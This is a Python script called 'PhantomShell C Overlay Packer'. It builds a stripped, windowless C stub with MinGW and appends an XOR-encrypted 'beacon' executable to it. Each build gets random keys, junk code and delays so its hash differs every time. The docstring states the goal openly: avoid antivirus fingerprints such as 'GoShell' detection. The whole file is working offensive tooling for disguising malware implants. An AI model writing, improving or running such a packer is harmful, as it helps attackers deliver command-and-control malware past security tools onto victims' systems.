#!/usr/bin/env python3
"""
PhantomShell C Overlay Packer
Compiles a tiny C stub (~15KB) with MinGW, then appends XOR-encrypted payload.

Unlike Go stubs, C stubs:
  - Are 15-20KB (vs 1600KB) — less surface area for detection
  - Have no Go runtime fingerprint — immune to "GoShell" detection
  - Use only kernel32 + user32 + shell32 (all standard system DLLs)

Usage:
    python packer_c.py --input beacon_v4.exe --output packed.exe
"""

import os
import sys
import struct
import uuid
import shutil
import base64
import random
import string
import hashlib
import argparse
import subprocess
import tempfile
from pathlib import Path

SCRIPT_DIR = Path(__file__).parent.resolve()
STUB_FILE  = SCRIPT_DIR / "stub.c"
OUTPUT_DIR = SCRIPT_DIR / "output"

GCC_CANDIDATES = [
    r"D:\mingw64\bin\gcc.exe",
    "gcc",
    r"C:\mingw64\bin\gcc.exe",
]


def find_gcc() -> Path:
    for c in GCC_CANDIDATES:
        p = Path(c)
        try:
            r = subprocess.run([str(p), "--version"], capture_output=True, text=True, timeout=5)
            if r.returncode == 0:
                return p
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
    print("[-] MinGW gcc not found!")
    sys.exit(1)


def rand_hex(n: int = 8) -> str:
    return "".join(random.choices("0123456789ABCDEF", k=n)).upper()


def pack_c(input_exe: Path, output_name: str):
    if not input_exe.exists():
        print(f"[-] Input not found: {input_exe}")
        sys.exit(1)

    gcc = find_gcc()
    print(f"[+] GCC   : {gcc}")

    # ── 1. Read payload ─────────────────────────────
    payload = input_exe.read_bytes()
    payload_hash = hashlib.sha256(payload).hexdigest()[:16]
    print(f"[*] Payload: {input_exe.name} ({len(payload)/1024:.1f} KB)")
    print(f"[*] Hash   : {payload_hash}")

    # ── 2. XOR encrypt ──────────────────────────────
    xor_key = bytes(random.randint(0, 255) for _ in range(64))
    encrypted = bytes(b ^ xor_key[i % 64] for i, b in enumerate(payload))
    print(f"[*] XOR key: {xor_key[:8].hex()}...")

    # ── 3. Generate randomized C source ──────────────
    if not STUB_FILE.exists():
        print(f"[-] Stub not found: {STUB_FILE}")
        sys.exit(1)
    template = STUB_FILE.read_text(encoding="utf-8")

    seed = uuid.uuid4().hex[:16]
    key_c = ", ".join(f"0x{b:02X}" for b in xor_key)

    replacements = {
        "{{KEY_BYTES}}":   key_c,
        "{{BUILD_ID}}":    seed,
        "{{JUNK_SEED}}":   str(random.randint(1000, 99999)),
        "{{JUNK_LOOP}}":   str(random.randint(5, 20)),
        "{{JUNK_LOOP2}}":  str(random.randint(10, 50)),
        "{{JUNK_XOR}}":    rand_hex(8),
        "{{DELAY_MIN}}":   str(random.randint(5, 30)),
        "{{DELAY_RANGE}}": str(random.randint(10, 60)),
        "{{NAME_LEN}}":    str(random.randint(6, 12)),
    }

    source = template
    for k, v in replacements.items():
        source = source.replace(k, v)

    # ── 4. Compile C stub ────────────────────────────
    OUTPUT_DIR.mkdir(exist_ok=True)
    output_path = OUTPUT_DIR / output_name

    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)
        c_file = tmp / "stub.c"
        c_file.write_text(source, encoding="utf-8")

        stub_exe = tmp / "stub.exe"
        build_cmd = [
            str(gcc),
            "-s",           # strip symbols
            "-O2",          # optimize
            "-mwindows",    # GUI subsystem (no console)
            "-o", str(stub_exe),
            str(c_file),
            "-luser32",
            "-lshell32",
        ]

        print(f"\n[*] Compiling C stub...")
        result = subprocess.run(
            build_cmd, capture_output=True, text=True, timeout=30
        )

        if result.returncode != 0:
            print(f"[-] Build FAILED:")
            print(result.stderr[-2000:])
            sys.exit(1)

        stub_size = stub_exe.stat().st_size
        print(f"    Stub size: {stub_size/1024:.1f} KB")

        # ── 5. Append payload + size marker ──────────
        with open(stub_exe, "ab") as f:
            f.write(encrypted)
            f.write(struct.pack("<Q", len(encrypted)))

        final_size = stub_exe.stat().st_size
        shutil.copy2(stub_exe, output_path)

    # ── 6. Report ─────────────────────────────────────
    final_hash = hashlib.sha256(output_path.read_bytes()).hexdigest()[:16]

    print(f"\n{'='*60}")
    print(f"[+] PACK SUCCESS")
    print(f"    File  : {output_path}")
    print(f"    Size  : {final_size/1024:.1f} KB (stub: {stub_size/1024:.0f}KB + payload: {len(encrypted)/1024:.0f}KB)")
    print(f"    Hash  : {final_hash}")
    print(f"    Inner : {payload_hash}")
    print(f"    Method: C stub + Overlay XOR (64-byte key)")
    print(f"\n[*] Stub is native C (MinGW) — no Go runtime, no 'GoShell' fingerprint")
    print(f"[*] Each build: random key, random junk, unique hash\n")


def main():
    p = argparse.ArgumentParser(description="PhantomShell C Overlay Packer")
    p.add_argument("--input",  required=True,        help="Beacon EXE to pack")
    p.add_argument("--output", default="packed.exe", help="Output filename")
    args = p.parse_args()
    pack_c(Path(args.input), args.output)


if __name__ == "__main__":
    main()
